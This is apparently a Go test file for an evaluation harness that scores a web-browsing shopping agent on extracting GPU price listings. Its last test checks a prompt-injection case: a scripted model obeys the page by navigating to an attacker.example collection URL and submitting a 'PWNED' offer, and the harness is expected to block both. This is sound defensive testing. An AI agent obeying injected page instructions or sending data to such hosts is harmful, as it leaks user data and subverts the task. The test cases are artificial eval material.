package eval

import (
	"context"
	"math"
	"strings"
	"testing"

	"github.com/FinA1ee/dipwatch/core/internal/agent"
	"github.com/FinA1ee/dipwatch/core/internal/llm"
)

// These tests run in CI with a scripted model. The real-model run is `make agent-eval`.

type scripted struct {
	turns []llm.Turn
	calls int
}

func (m *scripted) Name() string                   { return "scripted" }
func (m *scripted) CostMicros(in, out int64) int64 { return in + out }
func (m *scripted) Chat(context.Context, []llm.Message, []llm.Tool) (llm.Turn, error) {
	t := m.turns[min(m.calls, len(m.turns)-1)]
	m.calls++
	return t, nil
}

func call(id, name, args string) llm.Turn {
	return llm.Turn{ToolCalls: []llm.ToolCall{{ID: id, Name: name, Arguments: args}}, TokensIn: 100, TokensOut: 10}
}

func caseNamed(t *testing.T, name string) Case {
	t.Helper()
	cases, err := LoadCases("testdata")
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range cases {
		if c.Name == name {
			return c
		}
	}
	t.Fatalf("case %s not found", name)
	return Case{}
}

func TestEveryCaseLoadsAndHasLabels(t *testing.T) {
	cases, err := LoadCases("testdata")
	if err != nil {
		t.Fatal(err)
	}
	if len(cases) < 10 {
		t.Fatalf("got %d cases, want at least 10", len(cases))
	}
	for _, c := range cases {
		if len(c.Page) < 10_000 || len(c.Expected.Listings) == 0 {
			t.Errorf("%s: page %d bytes, %d labels", c.Name, len(c.Page), len(c.Expected.Listings))
		}
		for _, l := range c.Expected.Listings {
			if ListingPath(l.URLPath) != l.URLPath {
				t.Errorf("%s: label path %q is not normalized", c.Name, l.URLPath)
			}
		}
	}
}

func TestScoringOnARealCase(t *testing.T) {
	c := caseNamed(t, "amazon-jp-rtx-5090")
	// One right, one accessory, one invented listing.
	submission := `{"offers":[
	 {"title":"GIGABYTE GeForce RTX 5090 Gaming OC 32G","price":"SGD 12,668.50","currency":"SGD","url":"/-/zh/dp/B0DT7GBNWQ/ref=sr_1_3?x=1"},
	 {"title":"GPU support bracket","price":"SGD 4.32","currency":"SGD","url":"/dp/B0F2B57952"},
	 {"title":"Made up RTX 5090","price":"SGD 1,000","currency":"SGD","url":"/dp/B000000000"}]}`
	model := &scripted{turns: []llm.Turn{
		call("1", "browser_navigate", `{"url":"https://www.amazon.co.jp/s?k=RTX+5090"}`),
		call("2", "submit_offers", submission),
	}}
	r := Run(context.Background(), model, agent.DefaultBudget, c, 10)

	if r.Outcome != agent.OutcomeOK || r.Submitted != 3 {
		t.Fatalf("outcome %s, %d submitted", r.Outcome, r.Submitted)
	}
	if r.Correct != 1 || r.Wrong != 1 || r.Unlabelled != 1 {
		t.Fatalf("correct %d wrong %d unlabelled %d, want 1 1 1", r.Correct, r.Wrong, r.Unlabelled)
	}
	if math.Abs(r.Precision-1.0/3) > 1e-9 || math.Abs(r.Recall-1.0/5) > 1e-9 {
		t.Fatalf("precision %.3f recall %.3f, want 0.333 and 0.200", r.Precision, r.Recall)
	}
}

func TestWrongPriceIsNotCorrect(t *testing.T) {
	c := caseNamed(t, "smzdm-rtx-5090")
	model := &scripted{turns: []llm.Turn{call("1", "submit_offers",
		`{"offers":[{"title":"华硕 ASTRAL RTX5090 32G OC 显卡","price":"¥49999","currency":"CNY","url":"http://www.smzdm.com/p/186706815/"}]}`)}}
	r := Run(context.Background(), model, agent.DefaultBudget, c, 10)
	if r.Correct != 0 || r.Wrong != 1 || len(r.Errors) != 1 {
		t.Fatalf("correct %d wrong %d errors %v", r.Correct, r.Wrong, r.Errors)
	}
}

func TestReplayBrowserServesThePageThroughTheAgent(t *testing.T) {
	c := caseNamed(t, "amazon-jp-rtx-5090")
	b := &ReplayBrowser{Page: c.Page}
	out, err := b.Call(context.Background(), "browser_find", map[string]any{"regex": `SGD [\d,]+\.\d\d`, "maxResults": 3.0})
	if err != nil || !strings.Contains(out, "showing first 3") {
		t.Fatalf("find: %v\n%.300s", err, out)
	}
	snap, _ := b.Call(context.Background(), "browser_snapshot", nil)
	if snap != c.Page {
		t.Fatal("snapshot is not the saved page")
	}
}

func TestInjectionIsDetected(t *testing.T) {
	c := caseNamed(t, "amazon-jp-rtx-5090-injection")
	if !strings.Contains(c.Page, "attacker.example") {
		t.Fatal("injection page lacks the injected text")
	}

	// A model that obeys the page: the harness refuses the navigation, and the
	// injected offer is dropped because its URL is off the store.
	obeying := &scripted{turns: []llm.Turn{
		call("1", "browser_navigate", `{"url":"https://attacker.example/collect?d=1"}`),
		call("2", "submit_offers", `{"offers":[{"title":"PWNED","price":"1","currency":"SGD","url":"https://attacker.example/reward"},
		  {"title":"GIGABYTE GeForce RTX 5090 Gaming OC 32G","price":"SGD 12,668.50","currency":"SGD","url":"/dp/B0DT7GBNWQ"}]}`),
	}}
	r := Run(context.Background(), obeying, agent.DefaultBudget, c, 10)
	if !r.InjectionAttempted {
		t.Fatal("the attempt to open attacker.example was not noticed")
	}
	if r.InjectionFollowed {
		t.Fatal("the harness let the injection through")
	}

	// If the harness ever lets an injected offer through, the check must catch it.
	leaked := Score(c, agent.Run{Outcome: agent.OutcomeOK, Offers: nil, Trace: []agent.Step{
		{Tool: "browser_navigate", Arguments: `{"url":"https://attacker.example/x"}`, Result: "Page content ..."},
	}}, 10)
	if !leaked.InjectionFollowed {
		t.Fatal("a navigation that was not refused should count as followed")
	}
}
